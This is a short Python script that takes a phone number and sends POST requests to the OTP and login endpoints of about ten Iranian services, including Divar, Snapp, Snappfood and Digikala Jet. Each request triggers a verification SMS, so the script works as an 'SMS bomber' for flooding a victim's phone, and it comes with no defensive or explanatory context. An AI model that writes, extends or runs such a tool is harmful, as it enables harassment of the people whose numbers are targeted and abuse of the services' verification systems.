import time
import requests


number = input("Enter number (without 0):")



url_divar = "https://api.divar.ir/v5/auth/authenticate"
json_divar = {"phone":number}

url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = {"cellphone": "+98" + number}

url_sf= "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=3bd046ba-81bc-4c39-8d3f-36da06a0cd7d&locale=fa"
json_sf = {"cellphone": "0" + number}

url_bdk =  "https://www.buskool.com/send_verification_code"
json_bdk = {"phone": "0" + number}

url_ssh = "https://app.itoll.com/api/v1/auth/login"
json_ssh = {"mobile": "0" + number}

url_bm = "https://uiapi2.saapa.ir/api/otp/sendCode"
json_bm = {"mobile": "0" + number}

url_dkj =  "https://api.digikalajet.ir/user/login-register/"
json_dkj = {"phone": "0" + number}

url_gbm =  "https://taraazws.jabama.com/api/v4/account/send-code"
json_gbm = {"mobile": "0" + number}

url_mr =  "https://www.miare.ir/api/otp/client/request/"
json_mr = {"phone_number": "0" + number}

url_beh =  "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/"
json_beh = {"phone": "0" + number}




req = requests.post(url=url_divar,json=json_divar)
print(req)

req1 = requests.post(url=url_snapp,json=json_snapp)
print(req1)

req2 = requests.post(url=url_sf,json=json_sf)
print(req1)

req3 = requests.post(url=url_bdk,json=json_bdk)
print(req3)

req4 = requests.post(url=url_ssh,json=json_ssh)
print(req4)

req5 = requests.post(url=url_bm,json=json_bm)
print(req5)

req6 = requests.post(url=url_dkj,json=json_dkj)
print(req6)

req7 = requests.post(url=url_gbm,json=json_gbm)
print(req7)

req8 = requests.post(url=url_mr,json=json_mr)
print(req8)

req9 = requests.post(url=url_beh,json=json_beh)
print(req9)

